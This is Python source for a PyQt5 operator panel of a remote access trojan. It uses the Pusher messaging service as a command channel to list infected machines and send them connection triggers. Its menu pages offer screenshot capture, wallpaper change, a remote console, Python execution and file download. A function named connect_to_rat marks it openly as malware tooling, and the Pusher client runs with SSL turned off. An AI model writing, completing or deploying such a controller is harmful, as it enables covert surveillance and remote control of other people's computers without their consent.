# Imports
import sys
from PyQt5 import QtWidgets, QtCore
from data.settings import Settings
import pusher
import pusher.errors
import pysher
import modules.exception as exception
from BlurWindow.blurWindow import GlobalBlur
sys.path.append('gui')
# Importing the main window
try:
    from gui import Ui_MainWindow
    from functions import *
except ImportError:
    from gui.gui import Ui_MainWindow
    from gui.functions import *

# Hooking exceptions
sys.excepthook = exception.hook

# Getting config
settings = Settings.get_settings()

# Global variables for annotations
client = pusher.Pusher
receiver = pysher.Pusher
channel: receiver.subscribe = None
client_id = str()

# Initializing the main window
app = QtWidgets.QApplication(sys.argv)
MainWindow = QtWidgets.QMainWindow()
ui = Ui_MainWindow()
ui.setupUi(MainWindow)
ui.pagesWidget.setCurrentIndex(0)
GlobalBlur(MainWindow.winId(), Acrylic=True)

# Trying to get settings or set default
try:
    fill_settings(ui)
except Exception as e:
    print(e)
    Settings.fix()

# Creating gui
MainWindow.show()


def initialize_pusher() -> None:
    """
    Registers the pusher client and receiver
    :return:
    """
    global client
    global receiver
    try:
        client = pusher.Pusher(
            app_id=settings["app_id"],
            key=settings["key"],
            secret=settings["secret"],
            cluster=settings["cluster"],
            ssl=False
        )
        receiver = pysher.Pusher(key=settings["key"], cluster=settings["cluster"])
        receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
        receiver.connect()
    except Exception as e:
        print(e)


def open_menu(*args) -> None:
    """
    Animates the menu to open and close, using animation from config
    :return:
    """
    width = ui.leftMenu.geometry().width()
    Ui_MainWindow.animation = QtCore.QPropertyAnimation(ui.leftMenu, b"minimumWidth")
    Ui_MainWindow.animation.setDuration(Settings.animation()["timing"])
    if width == 60:
        Ui_MainWindow.animation.setStartValue(60)
        Ui_MainWindow.animation.setEndValue(200)
    else:
        Ui_MainWindow.animation.setStartValue(200)
        Ui_MainWindow.animation.setEndValue(60)
    Ui_MainWindow.animation.setEasingCurve(Settings.animation()["animation"])

    Ui_MainWindow.animation.start()


def handle_menu_click(text: str) -> None:
    """
    Handles the click on the menu and changes the page
    :param text:
    :return:
    """
    index = {
        "Menu": [open_menu, None],
        "Devices": [ui.pagesWidget.setCurrentIndex, 1],
        "Screenshot": [ui.pagesWidget.setCurrentIndex, 2],
        "Wallpaper": [ui.pagesWidget.setCurrentIndex, 3],
        "Console": [ui.pagesWidget.setCurrentIndex, 4],
        "Python": [ui.pagesWidget.setCurrentIndex, 5],
        "Download": [ui.pagesWidget.setCurrentIndex, 6],
        "Settings": [ui.pagesWidget.setCurrentIndex, 7]
    }
    index[text][0](index[text][1])


def connect_to_rat() -> None:
    """
    Connects to rat based on selected id
    :return:
    """
    global client_id
    try:
        client_id = ui.availableDevices.currentItem().text()
        client.trigger('admin-' + str(client_id), 'connection_from_admin', None)
        print("Sent connection message to client")
    except Exception as e:
        print(e)


def handle_connection_to_server(connection) -> None:
    """
    On pusher connection
    :return:
    """
    print("Connected to server")
    print("Server returned: " + str(connection))
    try:
        for client_id_av in list(client.channels_info(prefix_filter='admin-')['channels']):
            ui.availableDevices.addItem(client_id_av.split('-')[1])
    except pusher.errors.PusherBadRequest:
        popup("Error", "Could not connect to pusher server\n"
                       "Do you have valid pusher config in settings tab?")


def reconnect_to_pusher() -> None:
    """
    Reconnects to pusher
    :return:
    """
    global receiver
    try:
        receiver.disconnect()
        print("Disconnected from pusher")
    except:
        print("Pusher not connected")
    initialize_pusher()


# Trying to connect to pusher
initialize_pusher()

# Connecting user interface to functions
ui.leftMenu.itemClicked.connect(lambda: handle_menu_click(ui.leftMenu.currentItem().text()))
ui.saveSettingsButton.clicked.connect(lambda: (globals().update(settings=update_settings(ui))))
ui.reconRefreshButton.clicked.connect(lambda: reconnect_to_pusher())
ui.connectButton.clicked.connect(lambda: connect_to_rat())

# Handling closing of the window to exit whole program
sys.exit(app.exec_())
